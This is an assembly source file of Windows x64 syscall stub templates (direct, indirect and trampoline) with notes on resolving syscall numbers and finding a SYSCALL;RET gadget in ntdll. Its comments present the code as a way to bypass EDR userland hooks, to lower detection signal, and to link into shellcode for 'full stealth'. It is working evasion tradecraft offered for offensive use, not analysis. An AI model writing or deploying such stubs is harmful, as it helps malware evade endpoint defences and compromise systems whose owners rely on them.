; =============================================================================
; syscall-stub-windows.asm — NASM Windows x64 Syscall Stub Templates
; Usage: nasm -f win64 syscall-stub-windows.asm -o stub.obj
; Or: link inline into shellcode (remove data section for PIC use)
; =============================================================================

BITS 64

; =============================================================================
; TEMPLATE A: Direct Syscall
;   Issue SYSCALL directly from our .text — bypasses all userland hooks.
;   Detection: kernel ETW sees RIP outside ntdll — moderate/high EDR signal.
;   Use: Early-Bird, before hooks load, or on systems without kernel callbacks.
; =============================================================================
section .text

; NtAllocateVirtualMemory_Direct(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG)
; All args follow Win64 fastcall: RCX, RDX, R8, R9, [RSP+0x28], [RSP+0x30]
global NtAllocateVirtualMemory_Direct
NtAllocateVirtualMemory_Direct:
    mov   r10, rcx              ; arg1: kernel ABI requires arg1 in R10
    mov   eax, [rel wSSN_NtAVM] ; load SSN resolved at runtime
    syscall
    ret

; =============================================================================
; TEMPLATE B: Indirect Syscall
;   Load SSN, then JMP to SYSCALL;RET gadget inside ntdll.
;   Kernel records RIP = ntdll gadget — lowest EDR signal for syscalls.
;   Combine with call-stack spoofing (Draugr / SilentMoonwalk) for full stealth.
; =============================================================================

; NtAllocateVirtualMemory_Indirect — same signature as above
global NtAllocateVirtualMemory_Indirect
NtAllocateVirtualMemory_Indirect:
    mov   r10, rcx
    mov   eax, [rel wSSN_NtAVM]
    jmp   [rel pGadget_NtAVM]   ; JMP into ntdll SYSCALL;RET gadget

; =============================================================================
; TEMPLATE C: Trampoline Dispatch (generic — single entry point, variable SSN)
;   Caller sets RAX = SSN and R15 = gadget addr before reaching here.
;   Used by RecycleGate and similar frameworks.
; =============================================================================

; reCycall(ssn uintptr, gadget uintptr, ...args...)
; RAX already set by caller to SSN; R15 to gadget
global reCycall_Trampoline
reCycall_Trampoline:
    mov   r10, rcx
    ; RAX = SSN (caller-set), R15 = gadget (caller-set)
    call  r15                   ; CALL -> ntdll SYSCALL;RET -> returns here
    ret

; =============================================================================
; Data section — fill these at runtime via DWhisper / SysWhispers SSN resolution
; =============================================================================
section .data

; SSN for NtAllocateVirtualMemory — MUST be resolved at runtime
wSSN_NtAVM:     dd 0            ; fill via DWhisper export-sort

; Gadget pointer: ntdll!ZwAllocateVirtualMemory + 0x12 (offset to 0F 05 C3)
pGadget_NtAVM:  dq 0            ; fill at runtime by scanning ntdll exports

; =============================================================================
; NOTES
; -----------------------------------------------------------------------------
; 1. SSN resolution — preferred: DWhisper export-sort (hook-immune)
;    a. Walk ntdll export table via GS:[0x60] -> PEB -> Ldr -> ntdll base
;    b. Collect all Zw* exports with their VirtualAddress
;    c. Sort by VirtualAddress; SSN = sorted index
;    d. NtXxx SSN == ZwXxx SSN (same underlying stub)
;
; 2. Gadget search — scan ntdll .text for bytes [0x0F, 0x05, 0xC3]
;    First hit inside any ZwXxx stub is the SYSCALL;RET gadget.
;    Common offset: export_start + 0x12 (after mov r10,rcx; mov eax,SSN)
;
; 3. For PIC shellcode — convert .data to RIP-relative:
;      lea  rbx, [rel wSSN_NtAVM]
;      mov  eax, [rbx]
;
; 4. Stack alignment — ensure RSP is 16-byte aligned before CALL/syscall.
;    See assets/peb-walk-x64.asm for an AlignRSP entry stub.
; =============================================================================
